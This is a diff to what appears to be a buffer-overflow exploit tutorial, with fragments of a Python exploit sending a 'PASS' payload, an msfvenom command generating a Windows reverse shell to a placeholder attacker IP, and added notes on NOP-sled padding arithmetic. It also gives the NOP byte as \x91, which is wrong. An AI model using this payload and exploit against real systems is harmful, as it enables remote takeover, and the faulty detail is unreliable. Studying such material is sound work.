@@ -233,7 +233,7 @@ s.send('PASS ' + payload + '\r\n')
 print "\nDone!."
 ```
 
-*NOTE:* The return address is written in little endian format.
+*NOTE:* The return address is written in little-endian format (reversely).
 
 ## Shellcode
 
@@ -244,7 +244,18 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<MY_ATTACKER_IP> LPORT=443 -f c -a x
 ```
 
 This will create us encoded, bad chars free shellcode in 351 bytes long.
-Also we will need to add some NOP sleds (\x91) to our exploit:
+
+Now we need to pad our shellcode with NOP (no-operation) instructions which basiclly "slide" the execution flow to the next memory address, in our case, until it hits the start of the shellcode.
+
+We need to calculate NOP sleds as following:
+
+ [offset_total A's (0x41)] - [eip] - [shellcode]
+
+In our case:
+
+2606 - 4 - 351 = 2251 bytes left for our payload data and our nopsled.
+
+So we will use 16 times NOP sleds (\x91) and substract it from our final padding:
 
 ```
 import socket
